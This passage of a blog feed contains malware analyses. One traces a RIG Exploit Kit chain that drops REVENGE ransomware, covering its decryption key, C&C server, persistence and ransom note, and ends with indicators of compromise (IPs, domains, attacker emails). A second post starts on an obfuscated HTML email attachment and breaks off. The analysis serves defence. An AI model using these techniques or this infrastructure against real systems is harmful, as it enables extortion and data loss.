href=&#34;https://2.bp.blogspot.com/-uvP2ir53P3Q/WM7EaYRfqwI/AAAAAAAAN7Y/dxATja5YEhgpu4qGaJDJBloHzQ6XHeGSgCLcB/s1600/Schermata%2B2017-03-19%2Balle%2B18.46.34.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;71&#34; src=&#34;https://2.bp.blogspot.com/-uvP2ir53P3Q/WM7EaYRfqwI/AAAAAAAAN7Y/dxATja5YEhgpu4qGaJDJBloHzQ6XHeGSgCLcB/s320/Schermata%2B2017-03-19%2Balle%2B18.46.34.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;&lt;span style=&#34;font-size: 12.8px;&#34;&gt;Third Stage:&amp;nbsp;&lt;/span&gt;Saving PE Object using 8 &#34;random&#34; (not really) characters&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;The FileSystemObject is then executed through the &lt;b&gt;WScript.Shell&lt;/b&gt; technique as shown in the next image.&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-hXPxfTIED7A/WM7G2g4LzCI/AAAAAAAAN7k/DL3CNmeUCAoJQpW035RU9sFkAbN_D2sAwCLcB/s1600/Schermata%2B2017-03-19%2Balle%2B18.57.25.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;95&#34; src=&#34;https://3.bp.blogspot.com/-hXPxfTIED7A/WM7G2g4LzCI/AAAAAAAAN7k/DL3CNmeUCAoJQpW035RU9sFkAbN_D2sAwCLcB/s320/Schermata%2B2017-03-19%2Balle%2B18.57.25.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;&lt;span style=&#34;font-size: 12.8px;&#34;&gt;Third Stage:&amp;nbsp;&lt;/span&gt;Running the fake shell32.dll&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;A &lt;b&gt;key&lt;/b&gt; argument is defined as &#34;&lt;u&gt;gexywoaxor&lt;/u&gt;&#34; and a &lt;b&gt;stream&lt;/b&gt; is taken from an url as shown in the following image.&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-6tONIExhA0M/WM7JMY3gCtI/AAAAAAAAN70/G0J6mTDD4CYeFrFT9PEH2bSFwQu6ulDUACLcB/s1600/Schermata%2B2017-03-19%2Balle%2B19.02.12.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;20&#34; src=&#34;https://3.bp.blogspot.com/-6tONIExhA0M/WM7JMY3gCtI/AAAAAAAAN70/G0J6mTDD4CYeFrFT9PEH2bSFwQu6ulDUACLcB/s400/Schermata%2B2017-03-19%2Balle%2B19.02.12.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;&lt;span style=&#34;font-size: 12.8px;&#34;&gt;Third Stage:&amp;nbsp;&lt;/span&gt;Key and Stream&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;A special function is crafted to &lt;b&gt;decrypt&lt;/b&gt; the stream having as a &lt;b&gt;key&lt;/b&gt; the defined one. The decoded stream is getting saved and launched according to the fake &lt;b&gt;shell32.dll&lt;/b&gt;.&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-QNniv-ukLOo/WM7JuaKmruI/AAAAAAAAN78/37cbZPylXHUhhlmEQAfd6ZLqpfgJo2KeACLcB/s1600/Schermata%2B2017-03-19%2Balle%2B19.08.13.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;320&#34; src=&#34;https://3.bp.blogspot.com/-QNniv-ukLOo/WM7JuaKmruI/AAAAAAAAN78/37cbZPylXHUhhlmEQAfd6ZLqpfgJo2KeACLcB/s320/Schermata%2B2017-03-19%2Balle%2B19.08.13.png&#34; width=&#34;315&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;&lt;span style=&#34;font-size: 12.8px;&#34;&gt;Third Stage:&amp;nbsp;&lt;/span&gt;Decryption stream function (key=&amp;nbsp;gexywoaxor)&lt;br /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Most of you would recognize &lt;b&gt;RIG Exploit kit &lt;/b&gt;which used to decrypt streaming (ADOBE StreamObj) objects through inline xor. That decrypt function would not use a simple xor, and for such a reason I would consider it as new version of RIG Exploit Kit. The overall behavior looks like standard RIG EK having threes infection browser scripts and stream decoding procedure.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Finally I&#39;ve got a Windows PE on my temporary directory and a script launching it from browser !&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Let&#39;s move on and see what it does. A first run the PE file gets information from its Command and Control server which, on my time, happened to be:&amp;nbsp;&lt;span style=&#34;background-color: rgba(0, 0, 0, 0.901961); color: #28fe14; font-family: &amp;quot;Andale Mono&amp;quot;; font-size: 12px; font-variant-ligatures: no-common-ligatures;&#34;&gt;193.70.90.120 (France)&lt;/span&gt;&lt;/div&gt;&lt;style type=&#34;text/css&#34;&gt;p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px &#39;Andale Mono&#39;; color: #28fe14; background-color: #000000; background-color: rgba(0, 0, 0, 0.9)} span.s1 {font-variant-ligatures: no-common-ligatures} &lt;/style&gt;  &lt;div style=&#34;text-align: justify;&#34;&gt;It downloaded a Public Key (maybe for encrypting files ?) as follows:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-MKRjVtqSdcQ/WM7MNmEmlBI/AAAAAAAAN8I/XT-OWMbhAkwssmJzwlSOQFoHsh85NUmEgCLcB/s1600/KeyExchange.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;206&#34; src=&#34;https://3.bp.blogspot.com/-MKRjVtqSdcQ/WM7MNmEmlBI/AAAAAAAAN8I/XT-OWMbhAkwssmJzwlSOQFoHsh85NUmEgCLcB/s320/KeyExchange.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;&lt;span style=&#34;font-size: 12.8px;&#34;&gt;Fourth Stage:&amp;nbsp;&lt;/span&gt;Downloaded Public Key&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;This behavior reminds me a romantic Ransomware attack, which happens to fit pretty well with RIG distribution rings. The sample starts with simple http GET but later on it keeps trace of its malicious activity (encrypted files) by posting, on the same C&amp;amp;C, the number of encrypted files and a unique serial number as well. The sample returns back two parameters: &lt;b&gt;id&lt;/b&gt; and &lt;b&gt;count&lt;/b&gt;.&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-ts-rJjKtBWs/WM7Ne5aAIDI/AAAAAAAAN8Q/2AB8ZqjwCz8zTLoniRlAcO9F3LT-gXhsACLcB/s1600/Schermata%2B2017-03-19%2Balle%2B19.25.56.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;74&#34; src=&#34;https://1.bp.blogspot.com/-ts-rJjKtBWs/WM7Ne5aAIDI/AAAAAAAAN8Q/2AB8ZqjwCz8zTLoniRlAcO9F3LT-gXhsACLcB/s320/Schermata%2B2017-03-19%2Balle%2B19.25.56.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;&lt;span style=&#34;font-size: 12.8px;&#34;&gt;Fourth Stage:&amp;nbsp;&lt;/span&gt;POST to C&amp;amp;C&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;id&lt;/b&gt; is different for every infection while it could be consider as a unique constant for a given one. &lt;b&gt;count&lt;/b&gt;&amp;nbsp;constantly increases its value as a counter depending to the number of encrypted files.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The sample presents some tricks to control the running environments such as (but not limited to): IsDebugPresent and VolumeChecking. The sample is a multi-thread encryptor which spawns an encrypting thread for each found system folder (limiting to 10 per times). The sample is not packed/encrypted from a well known packer/encryptor as the following image shows, but the real code (payload) is encoded into a Fourth Stage (let me define the Windows PE as fourth stage of infection).&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-1Fbb5JvsnOY/WM7PGrt4skI/AAAAAAAAN8c/0g2W0Xn3vXQpx8uisErGyirupc4F7ra4QCLcB/s1600/Schermata%2B2017-03-19%2Balle%2B19.33.40.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;167&#34; src=&#34;https://4.bp.blogspot.com/-1Fbb5JvsnOY/WM7PGrt4skI/AAAAAAAAN8c/0g2W0Xn3vXQpx8uisErGyirupc4F7ra4QCLcB/s320/Schermata%2B2017-03-19%2Balle%2B19.33.40.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;&lt;span style=&#34;font-size: 12.8px;&#34;&gt;Fourth Stage:&amp;nbsp;&lt;/span&gt;No known packers/encrypters are found&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The following image shows the real payload dynamically build in the heap of the fourth stage. As analyst I decided to not extract it but rather following on the original sample in order to understand how happens the control flow switch.&lt;/div&gt;&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-ylCjIc1sE8Q/WM7QO3zxsaI/AAAAAAAAN8k/6tysffW0zig734VyU99ZvkCspPCG3mgMACLcB/s1600/Schermata%2B2017-03-19%2Balle%2B00.01.02.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;170&#34; src=&#34;https://3.bp.blogspot.com/-ylCjIc1sE8Q/WM7QO3zxsaI/AAAAAAAAN8k/6tysffW0zig734VyU99ZvkCspPCG3mgMACLcB/s400/Schermata%2B2017-03-19%2Balle%2B00.01.02.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Stage Fifth: HEAP built payload&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;The fifth stage is run by the following code which after having built the payload straight into the memory gets the control flow by simple dynamic &#34;call&#34; to dynamic memory&lt;i&gt; [ebp+var_4]&lt;/i&gt;.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-ao73QWAVYXw/WM7QyyT4k_I/AAAAAAAAN8s/UIxU15te_cwRO7NIT4cayfuDY5o-54ajACLcB/s1600/Schermata%2B2017-03-19%2Balle%2B08.32.30.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;162&#34; src=&#34;https://3.bp.blogspot.com/-ao73QWAVYXw/WM7QyyT4k_I/AAAAAAAAN8s/UIxU15te_cwRO7NIT4cayfuDY5o-54ajACLcB/s400/Schermata%2B2017-03-19%2Balle%2B08.32.30.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Fifth Stage: getting control by call [ebp+var_4]&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;This is the last stage where the payload runs over the folders, read files and encrypt them by using a dynamically loaded cryptbase.dll and the downloaded public key. The payload per-se saves itself and get persistence by infiltrating on register keys. The following images show where the payload copies itself in the target machine&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-R-6veQKWuF4/WM7RyOKv_9I/AAAAAAAAN80/NFWbDXnMV90Tb6AYRzqOTPKmLWfzQhsfACLcB/s1600/Schermata%2B2017-03-19%2Balle%2B08.39.58.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;166&#34; src=&#34;https://2.bp.blogspot.com/-R-6veQKWuF4/WM7RyOKv_9I/AAAAAAAAN80/NFWbDXnMV90Tb6AYRzqOTPKmLWfzQhsfACLcB/s400/Schermata%2B2017-03-19%2Balle%2B08.39.58.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Fifth Stage: Payload Persistence&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Te payload saves itself as svchost file creating a folder named Microsofts\ Windows NT\svchost.exe as the most classic payloads does ! Cryptobase.dll functions are dynamically loaded, only few library functions have been involved which takes easy to track them down (the following images show the tracking down imported libraries).&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-TO4JlgDcYF8/WM7TCX-hfXI/AAAAAAAAN88/TJfVDApcwA0o1IgJZKXJRKc7Wrtyhm8igCLcB/s1600/Schermata%2B2017-03-19%2Balle%2B19.49.19.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;142&#34; src=&#34;https://1.bp.blogspot.com/-TO4JlgDcYF8/WM7TCX-hfXI/AAAAAAAAN88/TJfVDApcwA0o1IgJZKXJRKc7Wrtyhm8igCLcB/s320/Schermata%2B2017-03-19%2Balle%2B19.49.19.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Stage Fifth: Cryptobase.dll tracking functions&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Finally the SaveFile function write the ransom file: &lt;b&gt;# !!!HELP_FILE!!! #.TXT&lt;/b&gt;&amp;nbsp; to physical drives having the following content and encrypts file through&amp;nbsp;&lt;b&gt;.REVENGE &lt;/b&gt;extension&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-1QlQqanYXY4/WM7UJf2WxJI/AAAAAAAAN9E/GhksJH_kJpEcK4-8fVV0wfMqP9btEoAgQCLcB/s1600/Schermata%2B2017-03-19%2Balle%2B19.55.18.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;277&#34; src=&#34;https://1.bp.blogspot.com/-1QlQqanYXY4/WM7UJf2WxJI/AAAAAAAAN9E/GhksJH_kJpEcK4-8fVV0wfMqP9btEoAgQCLcB/s400/Schermata%2B2017-03-19%2Balle%2B19.55.18.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Ransom File&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Since the implemented languages are: &lt;b&gt;English, Italian, German, Polish and Korean &amp;nbsp;&lt;/b&gt;it is easy t believe this ransomware attack would target European countries mainly.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;While the infected website (&lt;span style=&#34;color: blue; text-align: justify;&#34;&gt;see.aliharperweddings.com&lt;/span&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;) has promptly been closed (now it belongs to GoDaddy) the Command and Control page is still up and running. Indeed t&lt;/span&gt;he command and control appears to be an old vulnerable &lt;b&gt;fake website&amp;nbsp;&lt;/b&gt;created on &lt;i&gt;2016-10-07T08:19:40Z&amp;nbsp;&lt;/i&gt;weaponized with an ancient content back to November 2014. The website is not a real one, it&#39;s a simple &#34;lorem ipsum&#34; with no apparent purpose. The following images shows the apparent not real website.&lt;/div&gt;&lt;style type=&#34;text/css&#34;&gt;p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px &#39;Andale Mono&#39;; color: #28fe14; background-color: #000000; background-color: rgba(0, 0, 0, 0.9)} span.s1 {font-variant-ligatures: no-common-ligatures} &lt;/style&gt;  &lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-H5B3L1G0lJA/WM8ERyGwAdI/AAAAAAAAN9Y/bzaHg8oxPwI46jKDtkSEtLCoL7gLaW0awCLcB/s1600/Schermata%2B2017-03-19%2Balle%2B23.19.49.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;400&#34; src=&#34;https://1.bp.blogspot.com/-H5B3L1G0lJA/WM8ERyGwAdI/AAAAAAAAN9Y/bzaHg8oxPwI46jKDtkSEtLCoL7gLaW0awCLcB/s400/Schermata%2B2017-03-19%2Balle%2B23.19.49.png&#34; width=&#34;205&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Command and Control Vulnerable Web Site&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;b&gt;Conclusions&lt;/b&gt;&lt;br /&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Despite the reverse engineering difficulty and/or the technical details I addressed in this quick and dirty post, I found an unusual C&amp;amp;C behavior. Usually attackers want to protect their C&amp;amp;C and are the first system (page, connection, services) to be closed and/or moved after a first disclosure. Indeed the attacker wont be &#34;syncholed&#34; by receiving injection commands into her malicious network. Contrary in this example the current C&amp;amp;C looks to be alive from October 2016. Please note that I am not saying it servers RIG from 2016 but it might have served many different EK over time, which makes me thinking to a well defined operation attributable to a RIG as a service group.&lt;/div&gt;&lt;br /&gt;&lt;b&gt;Useful IoC:&lt;/b&gt;&lt;br /&gt;- url:&amp;nbsp;&lt;span style=&#34;color: blue;&#34;&gt;see.aliharperweddings.com&lt;/span&gt;&lt;br /&gt;- url:&lt;span style=&#34;color: blue;&#34;&gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&#34;background-color: #f8f8f8; font-family: Consolas, Menlo, Monaco, &amp;quot;Lucida Console&amp;quot;, &amp;quot;Liberation Mono&amp;quot;, &amp;quot;DejaVu Sans Mono&amp;quot;, &amp;quot;Bitstream Vera Sans Mono&amp;quot;, monospace, serif; font-size: 12px;&#34;&gt;&lt;span style=&#34;color: blue;&#34;&gt;far.nycfatfreeze.com&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;- ip: 193.70.90.120&lt;br /&gt;- ip: 188.225.38.186&lt;br /&gt;- email: rev00@india.com&lt;br /&gt;- email: revenge00@writeme.com&lt;br /&gt;- email: rev_reserv@india.com&lt;br /&gt;- string:&amp;nbsp;5427136ABEE9451E&lt;br /&gt;- string: # !!!HELP_FILE!!! #.TXT&lt;br /&gt;- string:&amp;nbsp;&lt;span style=&#34;font-size: 12.8px; text-align: center;&#34;&gt;gexywoaxor&amp;nbsp;&lt;/span&gt;&lt;br /&gt;- file extension: REVENGE&lt;br /&gt;- File Name: 8 characters from {&lt;span style=&#34;text-align: justify;&#34;&gt;abcdehiklmnoprstuw02346&lt;/span&gt;}.exe&lt;br /&gt;&lt;br /&gt;&lt;b&gt;BONUS&lt;/b&gt;:&lt;br /&gt;A similar dropper (Third Stage) has been published on March 9th 2017 on &lt;a href=&#34;http://pastebin.com/4E1WhLfy&#34; target=&#34;_blank&#34;&gt;pastebin&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Crypt0l0cker Revival !</title>
      <link>http://marcoramilli.com/post/crypt0l0cker-revival-/</link>
      <pubDate>Sun, 12 Feb 2017 07:30:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/crypt0l0cker-revival-/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;A couple of days ago a colleague of mine gave me a &#34;brand new&#34; malicious content delivered by a single HTML page. The page was sent to an email box as part of a biggest attack. I found that vector particularly fun and so I&#39;d like to share some of the steps who took me through a personal investigation path made not for professional usage but just for fun.&lt;br /&gt;&lt;br /&gt;At first sight the HTML page looks like the following image.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-MRFn81Yc4oA/WJ66XyMgm_I/AAAAAAAANyo/87zHSTbd-VkJS35wXBCnV98Srzipq6E5wCLcB/s1600/Schermata%2B2017-02-11%2Balle%2B08.15.46.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;160&#34; src=&#34;https://1.bp.blogspot.com/-MRFn81Yc4oA/WJ66XyMgm_I/AAAAAAAANyo/87zHSTbd-VkJS35wXBCnV98Srzipq6E5wCLcB/s320/Schermata%2B2017-02-11%2Balle%2B08.15.46.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure1: Attack Vector. A simple HTML page&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;A white backgrounded HTML page with a single line test on it saying: &#34;print this document please&#34;. But what document ? Honestly I am in front of one of the ugliest &#34;fake email&#34; I ever seen. But let&#39;s move on and se what it really carries on. Opening the HTML content with a simple editor we might see a suspicious obfuscated Javascript. We are facing a first obfuscation stage.&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-O5RooHoq3eg/WJ671jFcHCI/AAAAAAAANy0/0XQVo5FEH081Q2gZoF14szEqlPawAPCBQCLcB/s1600/Schermata%2B2017-02-11%2Balle%2B08.21.48.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;221&#34; src=&#34;https://4.bp.blogspot.com/-O5RooHoq3eg/WJ671jFcHCI/AAAAAAAANy0/0XQVo5FEH081Q2gZoF14szEqlPawAPCBQCLcB/s400/Schermata%2B2017-02-11%2Balle%2B08.21.48.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure2: Obfuscated First Stage&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;Since Javascript is an interpreted language (such as .NET or .Java) is not hard to understand its behavior, indeed after some rounds of &#34;substitutions&#34; and &#34;concatenations&#34; it easy to get the following clear text result showing the end of the first stage.&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: justify;&#34;&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&lt;br 